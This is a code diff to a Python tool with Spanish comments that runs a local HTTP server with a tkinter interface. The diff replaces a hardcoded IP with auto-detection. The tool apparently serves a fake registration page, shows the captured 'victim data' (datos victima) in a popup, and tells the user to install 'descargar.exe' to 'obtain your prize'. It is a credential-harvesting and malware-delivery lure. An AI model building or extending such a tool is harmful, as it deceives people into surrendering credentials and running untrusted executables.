@@ -17,6 +17,17 @@ hilo = None  #Variable global para el hilo
 
 victim_data=None
 
+def get_local_ipv4():
+    try:
+        #Se conecta a un servidor externo para determinar la interfaz en uso
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))  #8.8.8.8 es el servir DNS de google
+            local_ip = s.getsockname()[0]
+        return local_ip
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/':
@@ -42,7 +53,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        response = f"<html><body><h1>Registro Exitoso</h1><p>Usuario: {username} ahora instala el archivo que se descargo para navegar libremente</p><a href='http://192.168.1.51:9000/descargar.exe' download='descargar.exe'>Click aqui para descargar el boleto</a></body></html>"
+        local_ipv4 = get_local_ipv4()
+        response = f"<html><body><h1>Registro Exitoso</h1><p>Usuario: {username} ahora instala el archivo que se descargo para obtener tu premio</p><a href='http://{local_ipv4}:9000/descargar.exe' download='descargar.exe'>Click aqui para descargar el boleto</a></body></html>"
         self.wfile.write(response.encode('utf-8'))
         messagebox.showinfo("Datos victima: ", victim_data)
 
@@ -68,7 +80,9 @@ def start_http_server_en_hilo(server_entry):
 
         httpd = HTTPServer(('0.0.0.0', 9000), handler)
 
-        server_entry.insert(tk.END, f"Servidor corriendo en http://192.168.1.51:{9000}.\n")
+        local_ipv4 = get_local_ipv4()
+
+        server_entry.insert(tk.END, f"Servidor corriendo en http://{local_ipv4}:{9000}.\n")
 
         httpd.timeout = 1  # Configura un tiempo de espera para las conexiones
         httpd.serve_forever()
